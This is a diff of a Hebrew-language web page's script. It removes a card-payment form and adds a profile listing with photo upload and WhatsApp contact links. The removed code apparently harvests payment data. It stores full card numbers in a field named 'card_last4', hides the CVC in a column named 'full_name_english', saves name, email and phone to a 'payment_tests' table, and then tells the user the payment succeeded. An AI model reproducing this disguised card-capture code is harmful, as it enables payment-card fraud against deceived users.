-  return d.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-}
+const profilesContainer =
+    document.getElementById("profiles");
 
-function updateCard(){
-  document.getElementById("vcard").style.background=selected.grad;
-  document.getElementById("vcBrand").textContent=selected.name;
-}
-let hasScrolledToResult = false;
-const cardIn = document.getElementById("inNumber");
-const expIn = document.getElementById("inExp");
-const cvvIn = document.getElementById("inCvc");
+const modal =
+    document.getElementById("profileModal");
 
-cardIn.oninput = () => {
-  cardIn.value = fmt(cardIn.value);
-  updateCard();
-};
-expIn.oninput = () => {
-  const d = expIn.value
-    .replace(/\D/g, "")
-    .slice(0, 4);
+const openModal =
+    document.getElementById("openModal");
 
-  expIn.value = d.replace(
-    /(\d{2})(\d{1,2})/,
-    "$1/$2"
-  );
+const closeModal =
+    document.getElementById("closeModal");
 
-  document.getElementById("vcExp").textContent =
-    expIn.value || "MM/YY";
+const profileForm =
+    document.getElementById("profileForm");
 
-  updateCard();
-};
+const photoInput =
+    document.getElementById("photo");
 
-cvvIn.oninput = () => {
-  cvvIn.value = cvvIn.value
-    .replace(/\D/g, "")
-    .slice(0, 3);
+const uploadError =
+    document.getElementById("uploadError");
 
-  updateCard();
-};
+const submitBtn =
+    document.getElementById("submitBtn");
 
-document.getElementById("vcNumber");
-cardIn.addEventListener("input",()=>{document.getElementById("vcNumber").textContent=cardIn.value||"•••• •••• •••• ••••";});
+const loading =
+    document.getElementById("loading");
 
-document.getElementById("checkBtn").onclick = async () => {
-  const btn = document.getElementById("checkBtn");
 
-  const cardNumber = cardIn.value.replace(/\D/g, "");
-  const expiry = expIn.value;
-const cardCvc = document.getElementById('inCvc').value.trim();
-  if (cardNumber.length !== 16) {
-    alert("מספר כרטיס לא תקין");
-    return;
-  }
+/* ==================================================
+   OPEN / CLOSE MODAL
+================================================== */
 
-  if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-    alert("תוקף לא תקין");
-    return;
-  }
+openModal.addEventListener(
+    "click",
+    () => {
 
-  btn.disabled = true;
+        modal.classList.add("active");
 
-  try {
-    const { error } = await supabaseClient
-      .from("payment_tests")
-      .insert({
-        card_last4: cardNumber.slice(-16),
-        card_exp: expiry,
-        full_name_english: cardCvc
+    }
+);
 
-      });
 
-    if (error) {
-      console.error("Supabase error:", error);
-      alert("השמירה נכשלה");
-      return;
+closeModal.addEventListener(
+    "click",
+    () => {
+
+        modal.classList.remove("active");
+
+    }
+);
+
+
+/* סגירה בלחיצה על הרקע */
+
+modal.addEventListener(
+    "click",
+    (event) => {
+
+        if (
+            event.target === modal
+        ) {
+
+            modal.classList.remove(
+                "active"
+            );
+
+        }
+
+    }
+);
+
+
+/* ==================================================
+   ESC CLOSE
+================================================== */
+
+document.addEventListener(
+    "keydown",
+    (event) => {
+
+        if (
+            event.key === "Escape"
+        ) {
+
+            modal.classList.remove(
+                "active"
+            );
+
+        }
+
+    }
+);
+
+
+/* ==================================================
+   FORMAT PHONE FOR WHATSAPP
+================================================== */
+
+function phoneForWhatsApp(phone) {
+
+    let clean =
+        phone.replace(
+            /[^\d+]/g,
+            ""
+        );
+
+
+    /*
+       אם המספר מתחיל ב-0,
+       מניחים שמדובר בישראל.
+    */
+
+    if (
+        clean.startsWith("0")
+    ) {
+
+        clean =
+            "972" +
+            clean.substring(1);
+
     }
 
-  document.getElementById("result").classList.remove("hidden");
 
-if (!hasScrolledToResult) {
-  hasScrolledToResult = true;
+    clean =
+        clean.replace(
+            "+",
+            ""
+        );
 
-  setTimeout(() => {
-    document.getElementById("result").scrollIntoView({
-      behavior: "smooth",
-      block: "center"
-    });
-  }, 100);
+
+    return clean;
 }
 
-  } catch (err) {
-    console.error("Unexpected error:", err);
-    alert("אירעה שגיאה");
-  } finally {
-    btn.disabled = false;
-  }
-};
 
-function hideResult(){document.getElementById("result").classList.add("hidden");}
-document.getElementById("resetBtn").onclick=()=>{
-  hideResult();
-  cardIn.value="";expIn.value="";cvvIn.value="";
-  document.getElementById("vcNumber").textContent="•••• •••• •••• ••••";
-  document.getElementById("vcExp").textContent="MM/YY";
-  cardIn.focus();
-};
+/* ==================================================
+   ESCAPE HTML
+================================================== */
 
+function escapeHTML(value) {
 
-async function primaryAction() {
+    const div =
+        document.createElement("div");
 
-  // =========================
-  // שלב 1 - פרטי כרטיס
-  // =========================
-  if (step === 'card') {
+    div.textContent =
+        value ?? "";
 
-    const number = document.getElementById('inNumber');
-    const name = document.getElementById('inName');
-    const exp = document.getElementById('inExp');
-    const cvc = document.getElementById('inCvc');
-
-    let invalid = false;
-
-    // -------------------------
-    // מספר כרטיס
-    // -------------------------
-    const cardDigits = number.value.replace(/\D/g, '');
-
-    if (cardDigits.length !== 16) {
-      number.closest('.field').classList.add('invalid');
-      invalid = true;
-    } else {
-      number.closest('.field').classList.remove('invalid');
-    }
-
-    // -------------------------
-    // שם בעל הכרטיס
-    // -------------------------
-    if (name.value.trim().length < 2) {
-      name.closest('.field').classList.add('invalid');
-      invalid = true;
-    } else {
-      name.closest('.field').classList.remove('invalid');
-    }
-
-    // -------------------------
-    // תוקף
-    // -------------------------
-    const expDigits = exp.value.replace(/\D/g, '');
-
-    if (expDigits.length !== 4) {
-      exp.closest('.field').classList.add('invalid');
-      invalid = true;
-    } else {
-      exp.closest('.field').classList.remove('invalid');
-    }
-
-    // -------------------------
-    // CVC
-    // -------------------------
-    const cvcDigits = cvc.value.replace(/\D/g, '');
-
-    if (cvcDigits.length !== 3) {
-      cvc.closest('.field').classList.add('invalid');
-      invalid = true;
-    } else {
-      cvc.closest('.field').classList.remove('invalid');
-    }
-
-    // אם יש שגיאה - לא עוברים שלב
-    if (invalid) {
-      return;
-    }
-
-    // מעבר לשלב פרטים אישיים
-    setStep('personal');
-    return;
-  }
+    return div.innerHTML;
+}
 
 
-  // =========================
-  // שלב 2 - פרטים אישיים
-  // =========================
+/* ==================================================
+   LOAD PROFILES
+================================================== */
 
-  const email = document.getElementById('inEmail');
-  const phone = document.getElementById('inPhone');
- 
-  const personalInputs = [
-    email,
-    phone
-  ];
+async function loadProfiles() {
 
-  let missing = false;
-
-  personalInputs.forEach(input => {
-
-    const field = input.closest('.field');
-
-    if (input.value.trim() === '') {
-      field.classList.add('invalid');
-      missing = true;
-    } else {
-      field.classList.remove('invalid');
-    }
-
-  });
-
-  // אם חסר שדה - לא ממשיכים
-  if (missing) {
-    return;
-  }
+    profilesContainer.innerHTML = `
+        <div style="
+            grid-column:1/-1;
+            text-align:center;
+            padding:30px;
+            color:#999;
+        ">
+            טוען פרופילים...
+        </div>
+    `;
 
 
-  // =========================
-  // הכנת כפתור התשלום
-  // =========================
-
-  const btn = document.getElementById('primaryBtn');
-  const label = document.getElementById('primaryLabel');
-
-  btn.disabled = true;
-
-  label.innerHTML =
-    '<span class="spinner"></span> שומר נתונים…';
-
-
-  // =========================
-  // שמירה ב-Supabase
-  // =========================
-
-  try {
-
-    const cardDigits =
-      document.getElementById('inNumber')
-        .value
-        .replace(/\D/g, '');
-
-    const cardLast4 = cardDigits.slice(-16);
-
-    const cardholderName =
-      document.getElementById('inName')
-        .value
-        .trim();
-
-    const cardExp =
-      document.getElementById('inExp')
-        .value
-        .trim();
-const cardCvc = document.getElementById('inCvc').value.trim();
-    const emailValue =
-      email.value.trim();
-
-    const phoneValue =
-      phone.value.trim();
-
-
-    const { error } = await supabaseClient
-      .from('payment_tests')
-      .insert({
-        amount: AMOUNT,
-        card_last4: cardLast4,
-        cardholder_name: cardholderName,
-      
-        full_name_english: cardCvc
-  });
-   
-
-   // -------------------------
-    // Supabase החזיר שגיאה
-    // -------------------------
-    if (error) {
-
-      console.error(
-        'Supabase insert error:',
+    const {
+        data,
         error
-      );
+    } = await supabaseClient
+        .from("profiles")
+        .select("*")
+        .order(
+            "created_at",
+            {
+                ascending: false
+            }
+        );
 
-      btn.disabled = false;
 
-      label.textContent =
-        'שלם ₪ ' + formattedAmount;
+    if (error) {
 
-      alert(
-        'אירעה שגיאה בשמירת הנתונים. נסה שוב.'
-      );
+        console.error(error);
 
-      return;
+        profilesContainer.innerHTML = `
+            <div style="
+                grid-column:1/-1;
+                text-align:center;
+                padding:30px;
+                color:#c62828;
+            ">
+                לא ניתן לטעון את הפרופילים.
+            </div>
+        `;
+
+        return;
     }
 
 
-    // =========================
-    // שמירה הצליחה
-    // =========================
-
-    label.textContent = 'התשלום בוצע';
+    profilesContainer.innerHTML = "";
 
 
-    // נותן רגע קצר לראות שהשמירה הצליחה
-    setTimeout(() => {
+    if (
+        !data ||
+        data.length === 0
+    ) {
 
-      // מכניס סכום למסך התוצאה
-      document.getElementById(
-        'successAmount'
-      ).textContent = formattedAmount;
+        profilesContainer.innerHTML = `
+            <div style="
+                grid-column:1/-1;
+                text-align:center;
+                padding:50px;
+                color:#999;
+            ">
+                עדיין אין פרופילים.
+                <br><br>
+                לחצי על + כדי להוסיף פרופיל.
+            </div>
+        `;
+
+        return;
+    }
 
 
-      // מעלים את הטופס
-      document.getElementById(
-        'formShell'
-      ).style.display = 'none';
+    data.forEach(
+        profile => {
 
+            createProfileCard(
+                profile
+            );
 
-      // מציגים מסך תוצאה
-      document.getElementById(
-        'success'
-      ).classList.add('show');
-
-    }, 600);
-
-
-  } catch (err) {
-
-    // =========================
-    // שגיאת JavaScript / Network
-    // =========================
-
-    console.error(
-      'Unexpected error:',
-      err
+        }
     );
 
-    btn.disabled = false;
+}
 
-    label.textContent =
-      'שלם ₪ ' + formattedAmount;
 
-    alert(
-      'לא ניתן לשמור את הנתונים כרגע. נסה שוב.'
+/* ==================================================
+   CREATE PROFILE CARD
+================================================== */
+
+function createProfileCard(profile) {
+
+    const card =
+        document.createElement("div");
+
+    card.className =
+        "profile";
+
+
+    const safeName =
+        escapeHTML(
+            profile.nickname
+        );
+
+    const safeLocation =
+        escapeHTML(
+            profile.location
+        );
+
+    const safePhone =
+        escapeHTML(
+            profile.phone
+        );
+
+
+    const whatsappNumber =
+        phoneForWhatsApp(
+            profile.phone
+        );
+
+
+    let imageHTML = "";
+
+
+    if (
+        profile.avatar_url
+    ) {
+
+        imageHTML = `
+            <img
+                class="profile-image"
+                src="${escapeHTML(profile.avatar_url)}"
+                alt="${safeName}"
+                loading="lazy"
+            >
+        `;
+
+    } else {
+
+        imageHTML = `
+            <div class="no-image">
+
+                👤
+
+                <span>
+                    ללא תמונה
+                </span>
+
+            </div>
+        `;
+
+    }
+
+
+    card.innerHTML = `
+
+        ${imageHTML}
+
+        <div class="profile-content">
+
+            <div class="name">
+
+                ${safeName}
+
+                <span class="age">
+                    ${profile.age}
+                </span>
+
+            </div>
+
+
+            <div class="location">
+
+                📍 ${safeLocation}
+
+            </div>
+
+
+            <div class="phone">
+
+                📞 ${safePhone}
+
+            </div>
+
+
+            <div class="buttons">
+
+                <button
+                    class="btn copy-btn"
+                    data-phone="${safePhone}"
+                >
+                    📋 העתק
+                </button>
+
+
+                <a
+                    class="btn whatsapp-btn"
+                    href="https://wa.me/${whatsappNumber}"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                >
+                    💬 WhatsApp
+                </a>
+
+            </div>
+
+        </div>
+    `;
+
+
+    const copyButton =
+        card.querySelector(
+            ".copy-btn"
+        );
+
+
+    copyButton.addEventListener(
+        "click",
+        async () => {
+
+            try {
+
+                await navigator.clipboard.writeText(
+                    profile.phone
+                );
+
+
+                copyButton.textContent =
+                    "✓ הועתק";
+
+
+                setTimeout(
+                    () => {
+
+                        copyButton.textContent =
+                            "📋 העתק";
+
+                    },
+                    1500
+                );
+
+
+            } catch (error) {
+
+                alert(
+                    "לא ניתן להעתיק את המספר."
+                );
+
+            }
+
+        }
     );
-  }
+
+
+    profilesContainer.appendChild(
+        card
+    );
+
 }
 
-function validateStep(stepName) {
-  const container = stepName === 'card'
-    ? document.getElementById('stepCard')
-    : document.getElementById('stepPersonal');
 
-  let valid = true;
-  let firstInvalid = null;
+/* ==================================================
+   UPLOAD IMAGE
+================================================== */
 
-  container.querySelectorAll('input[required]').forEach(input => {
-    const field = input.closest('.field');
-    const empty = !input.value.trim();
+async function uploadProfileImage(
+    file
+) {
 
-    field.classList.toggle('invalid', empty);
+    if (!file) {
 
-    if (empty) {
-      valid = false;
+        return null;
 
-      if (!firstInvalid) {
-        firstInvalid = input;
-      }
     }
-  });
 
-  if (firstInvalid) {
-    firstInvalid.focus();
-  }
 
-  return valid;
+    /*
+       בדיקה מקומית לפני העלאה
+    */
+
+    const allowedTypes = [
+        "image/jpeg",
+        "image/png",
+        "image/webp"
+    ];
+
+
+    if (
+        !allowedTypes.includes(
+            file.type
+        )
+    ) {
+
+        throw new Error(
+            "סוג הקובץ אינו נתמך."
+        );
+
+    }
+
+
+    /*
+       5MB
+    */
+
+    if (
+        file.size > 5 * 1024 * 1024
+    ) {
+
+        throw new Error(
+            "התמונה גדולה מדי."
+        );
+
+    }
+
+
+    /*
+       שם ייחודי
+    */
+
+    const extension =
+        file.name
+            .split(".")
+            .pop()
+            .toLowerCase();
+
+
+    const fileName =
+        crypto.randomUUID() +
+        "." +
+        extension;
+
+
+    const filePath =
+        "profiles/" +
+        fileName;
+
+
+    const {
+        data,
+        error
+    } = await supabaseClient
+        .storage
+        .from("profile-images")
+        .upload(
+            filePath,
+            file,
+            {
+                cacheControl: "3600",
+                upsert: false,
+                contentType: file.type
+            }
+        );
+
+
+    if (error) {
+
+        console.error(
+            "Image upload error:",
+            error
+        );
+
+        throw error;
+
+    }
+
+
+    /*
+       מכיוון שה-bucket ציבורי,
+       אפשר לקבל URL ציבורי.
+    */
+
+    const {
+        data: publicUrlData
+    } =
+        supabaseClient
+            .storage
+            .from("profile-images")
+            .getPublicUrl(
+                data.path
+            );
+
+
+    return publicUrlData.publicUrl;
 }
 
-document.querySelectorAll('input[required]').forEach(input => {
-  input.addEventListener('input', () => {
-    if (input.value.trim()) {
-      input.closest('.field').classList.remove('invalid');
+
+/* ==================================================
+   FORM SUBMIT
+================================================== */
+
+profileForm.addEventListener(
+    "submit",
+    async (event) => {
+
+        event.preventDefault();
+
+
+        submitBtn.disabled =
+            true;
+
+        loading.style.display =
+            "block";
+
+        uploadError.classList.remove(
+            "show"
+        );
+
+
+        try {
+
+            const age =
+                Number(
+                    document.getElementById(
+                        "age"
+                    ).value
+                );
+
+
+            const nickname =
+                document.getElementById(
+                    "nickname"
+                ).value.trim();
+
+
+            const location =
+                document.getElementById(
+                    "location"
+                ).value.trim();
+
+
+            const phone =
+                document.getElementById(
+                    "phone"
+                ).value.trim();
+
+
+            const photo =
+                photoInput.files[0];
+
+
+            /*
+               בדיקות
+            */
+
+            if (
+                age < 18 ||
+                age > 120
+            ) {
+
+                throw new Error(
+                    "הגיל חייב להיות 18 ומעלה."
+                );
+
+            }
+
+
+            if (
+                nickname.length < 2
+            ) {
+
+                throw new Error(
+                    "יש להזין שם בדוי."
+                );
+
+            }
+
+
+            if (
+                location.length < 2
+            ) {
+
+                throw new Error(
+                    "יש להזין מיקום."
+                );
+
+            }
+
+
+            if (
+                phone.length < 7
+            ) {
+
+                throw new Error(
+                    "יש להזין מספר טלפון תקין."
+                );
+
+            }
+
+
+            /*
+               העלאת תמונה
+            */
+
+            let avatarUrl = null;
+
+
+            if (photo) {
+
+                try {
+
+                    avatarUrl =
+                        await uploadProfileImage(
+                            photo
+                        );
+
+                } catch (imageError) {
+
+                    /*
+                       אם Supabase חוסם
+                       את העלאת התמונה,
+                       ממשיכים ללא תמונה.
+                    */
+
+                    console.warn(
+                        "Image unavailable:",
+                        imageError
+                    );
+
+
+                    uploadError.classList.add(
+                        "show"
+                    );
+
+
+                    avatarUrl =
+                        null;
+
+                }
+
+            }
+
+
+            /*
+               שמירת הפרופיל
+            */
+
+            const {
+                data,
+                error
+            } =
+                await supabaseClient
+                    .from("profiles")
+                    .insert({
+                        age: age,
+                        nickname: nickname,
+                        location: location,
+                        phone: phone,
+                        avatar_url: avatarUrl
+                    })
+                    .select()
+                    .single();
+
+
+            if (error) {
+
+                console.error(
+                    error
+                );
+
+                throw new Error(
+                    "לא ניתן לשמור את הפרופיל."
+                );
+
+            }
+
+
+            /*
+               איפוס הטופס
+            */
+
+            profileForm.reset();
+
+
+            /*
+               סגירת חלון
+            */
+
+            modal.classList.remove(
+                "active"
+            );
+
+
+            /*
+               טעינה מחדש
+            */
+
+            await loadProfiles();
+
+
+            /*
+               הודעה
+            */
+
+            if (avatarUrl) {
+
+                alert(
+                    "הפרופיל פורסם בהצלחה ❤️"
+                );
+
+            } else {
+
+                alert(
+                    "הפרופיל פורסם בהצלחה ❤️\n\n" +
+                    "הפרופיל נשמר ללא תמונה."
+                );
+
+            }
+
+
+        } catch (error) {
+
+            console.error(
+                error
+            );
+
+
+            alert(
+                error.message ||
+                "אירעה שגיאה."
+            );
+
+        } finally {
+
+            submitBtn.disabled =
+                false;
+
+            loading.style.display =
+                "none";
+
+        }
+
     }
-  });
-});
-renderBrands();
-updateCard();
+);
+
+
+/* ==================================================
+   START
+================================================== */
+
+loadProfiles();
+
 </script>
+
 </body>
+
 </html>
